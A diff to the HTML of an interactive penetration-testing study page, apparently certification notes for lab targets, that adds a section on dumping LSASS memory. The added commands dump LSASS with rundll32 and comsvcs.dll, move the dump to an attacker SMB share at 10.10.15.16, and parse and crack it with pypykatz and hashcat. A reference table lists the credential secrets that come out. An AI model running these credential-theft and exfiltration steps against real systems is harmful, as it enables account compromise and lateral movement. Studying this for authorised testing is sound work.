@@ -14,11 +14,11 @@
     <meta property="og:title" content="Password attacks" />
     <meta property="og:description" content="An interactive map of password attacks: brute-forcing and spraying network services (WinRM, SSH, RDP, SMB) with NetExec, Evil-WinRM and Hydra, credential stuffing and defaults, dumping Windows credentials (SAM, LSA, NTDS, DPAPI) with reg.exe and secretsdump, and cracking the hashes offline with John the Ripper and Hashcat." />
     <meta property="og:url" content="https://paracausaltelemetry.com/cpts/password-cracking/" />
-    <meta property="og:image" content="https://paracausaltelemetry.com/src/social-preview.png" />
+    <meta property="og:image" content="https://paracausaltelemetry.com/src/social-preview.png?v=17f992b5" />
     <meta property="og:image:width" content="1200" />
     <meta property="og:image:height" content="630" />
     <meta name="twitter:card" content="summary_large_image" />
-    <meta name="twitter:image" content="https://paracausaltelemetry.com/src/social-preview.png" />
+    <meta name="twitter:image" content="https://paracausaltelemetry.com/src/social-preview.png?v=17f992b5" />
     <link rel="icon" type="image/svg+xml" href="/src/favicon.svg?v=5" />
     <link rel="preload" as="font" type="font/woff2" href="/src/fonts/geist-var.woff2" crossorigin />
     <link rel="preload" as="font" type="font/woff2" href="/src/fonts/space-grotesk-var.woff2" crossorigin />
@@ -237,7 +237,7 @@ hydra -C defaults.list &lt;proto&gt;://&lt;ip&gt;</code></pre></div>
             <header class="pc-phase-head">
               <span class="pc-phase-num">03</span>
               <h2 class="pc-phase-title" id="pcphase-winhashes-title">Windows credentials: dump &amp; crack</h2>
-              <p class="pc-phase-blurb">Where Windows keeps credentials, how to dump SAM / LSA / NTDS with admin rights, and cracking the NT and DCC2 hashes that come out.</p>
+              <p class="pc-phase-blurb">Where Windows keeps credentials, how to dump the SAM hives, LSASS memory and LSA secrets with admin rights, and cracking the NT and DCC2 hashes that come out.</p>
             </header>
             <ul class="pc-tree pc-tree-root">
               <li class="pc-node has-kids" id="pcnode-wc-authflow">
@@ -327,6 +327,35 @@ hashcat -m 1000 hashestocrack.txt --show</code></pre></div>
                   <div class="pc-node-body"><p>With credentials that hold local admin, you can dump over SMB instead of touching disk: --sam for the local SAM hashes, --lsa for LSA secrets (which may expose service and cached credentials in cleartext). NetExec writes the loot to its logs for later cracking.</p><pre class="pc-cmd"><code>netexec smb 10.129.42.198 --local-auth -u bob -p &#39;HTB_@cademy_stdnt!&#39; --sam
 netexec smb 10.129.42.198 --local-auth -u bob -p &#39;HTB_@cademy_stdnt!&#39; --lsa</code></pre></div>
                 </details>
+              </li>
+              <li class="pc-node has-kids" id="pcnode-wc-lsass-attack">
+                <details class="pc-node-box">
+                  <summary><span class="pc-node-label">Attacking LSASS (memory dump)</span></summary>
+                  <div class="pc-node-body"><p>LSASS caches the credentials of every active logon session in memory, so dumping its process memory and parsing the dump offline yields hashes, and sometimes cleartext, without ever cracking the SAM. Take the same offline-first approach as the hives: snapshot LSASS, pull the dump to your box, parse it there. Modern AV flags the common dump methods as malicious, so expect to deal with that.</p></div>
+                </details>
+                <ul class="pc-tree">
+                <li class="pc-node" id="pcnode-wc-lsass-dump">
+                  <details class="pc-node-box">
+                    <summary><span class="pc-node-label">Dump LSASS memory</span></summary>
+                    <div class="pc-node-body"><p>Two methods built into Windows. With an interactive desktop: Task Manager, Processes tab, right-click Local Security Authority Process, Create dump file, which writes lsass.DMP to %temp%. From a shell: rundll32 calls comsvcs.dll&#39;s MiniDump function, which needs the LSASS PID first (tasklist /svc, or Get-Process lsass). Run it from an elevated prompt. The comsvcs route is faster and needs no GUI, but AV usually recognises it.</p><pre class="pc-cmd"><code>tasklist /svc
+Get-Process lsass
+rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full</code></pre></div>
+                  </details>
+                </li>
+                <li class="pc-node" id="pcnode-wc-lsass-exfil">
+                  <details class="pc-node-box">
+                    <summary><span class="pc-node-label">Exfiltrate the dump (smbserver)</span></summary>
+                    <div class="pc-node-body"><p>Pull lsass.dmp back to the attack host with Impacket&#39;s smbserver, exactly as with the SAM hives: start a share, then move the file over SMB. Keep -smb2support so modern Windows (SMBv1 disabled) will connect. Parsing offline keeps time on the target short.</p><pre class="pc-cmd"><code>sudo smbserver.py -smb2support CompData /home/you/Documents/
+C:\&gt; move C:\lsass.dmp \\10.10.15.16\CompData</code></pre></div>
+                  </details>
+                </li>
+                <li class="pc-node" id="pcnode-wc-lsass-pypykatz">
+                  <details class="pc-node-box">
+                    <summary><span class="pc-node-label">Parse with pypykatz, then crack</span></summary>
+                    <div class="pc-node-body"><p>pypykatz is Mimikatz reimplemented in Python, so it parses an LSASS dump offline on a Linux host (Mimikatz is Windows-only). pypykatz lsa minidump &lt;dump&gt; walks each logon session and prints its secrets: MSV (the NT and SHA1 hashes), WDIGEST (cleartext on older Windows), Kerberos (tickets and keys) and the DPAPI masterkey. The secret types are in the table below. Crack the NT hash with Hashcat mode 1000.</p><pre class="pc-cmd"><code>pypykatz lsa minidump /home/you/lsass.dmp
+hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt</code></pre></div>
+                  </details>
+                </li></ul>
               </li>
             </ul>
             <a class="pc-next" href="#pcphase-identify" data-to="identify"><span aria-hidden="true">&#8595;</span> Proceed to Identify the hash</a>
@@ -677,6 +706,29 @@ hashcat -m 1000 ntlm.txt --show</code></pre></div>
               </tbody>
             </table>
             <p class="pc-ref-empty" data-ref-empty="registry-hives" hidden>No match. Try a format name, a value, or clear the filter.</p>
+          </div>
+        </section>
+        <section class="pc-ref" id="pcref-lsass-secrets" aria-labelledby="pcref-lsass-secrets-title">
+          <div class="pc-ref-head">
+            <h2 id="pcref-lsass-secrets-title">What pypykatz pulls from LSASS</h2>
+            <p class="pc-ref-intro">The secret types pypykatz (and Mimikatz) extract from a logon session in an LSASS dump. Filter by secret.</p>
+          </div>
+          <div class="pc-ref-search" role="search">
+            <label class="pc-ref-label" for="pcref-lsass-secrets-q">Filter what pypykatz pulls from lsass</label>
+            <input class="tool-input pc-ref-input" id="pcref-lsass-secrets-q" type="search" autocomplete="off" placeholder="raw-md5, ntlm, zip&hellip;" data-ref-filter="lsass-secrets" />
+            <span class="pc-ref-count" data-ref-count="lsass-secrets" aria-live="polite"></span>
+          </div>
+          <div class="pc-ref-wrap">
+            <table class="pc-ref-table" data-ref-table="lsass-secrets">
+              <thead><tr><th scope="col">Secret</th><th scope="col">What it yields</th></tr></thead>
+              <tbody>
+                <tr data-search="msv the account&#39;s nt and sha1 password hashes (crack the nt with -m 1000)"><td>MSV</td><td>The account&#39;s NT and SHA1 password hashes (crack the NT with -m 1000)</td></tr>
+                <tr data-search="wdigest cleartext password on windows &lt;= 8 / server &lt;= 2012; disabled by default on modern windows"><td>WDIGEST</td><td>Cleartext password on Windows &lt;= 8 / Server &lt;= 2012; disabled by default on modern Windows</td></tr>
+                <tr data-search="kerberos cached tickets, encryption keys and pins, reusable against other domain-joined systems"><td>Kerberos</td><td>Cached tickets, encryption keys and PINs, reusable against other domain-joined systems</td></tr>
+                <tr data-search="dpapi the logon session&#39;s masterkey, which decrypts that user&#39;s dpapi secrets (browser, rdp, credential manager)"><td>DPAPI</td><td>The logon session&#39;s masterkey, which decrypts that user&#39;s DPAPI secrets (browser, RDP, Credential Manager)</td></tr>
+              </tbody>
+            </table>
+            <p class="pc-ref-empty" data-ref-empty="lsass-secrets" hidden>No match. Try a format name, a value, or clear the filter.</p>
           </div>
         </section>
         <section class="pc-ref" id="pcref-router-defaults" aria-labelledby="pcref-router-defaults-title">
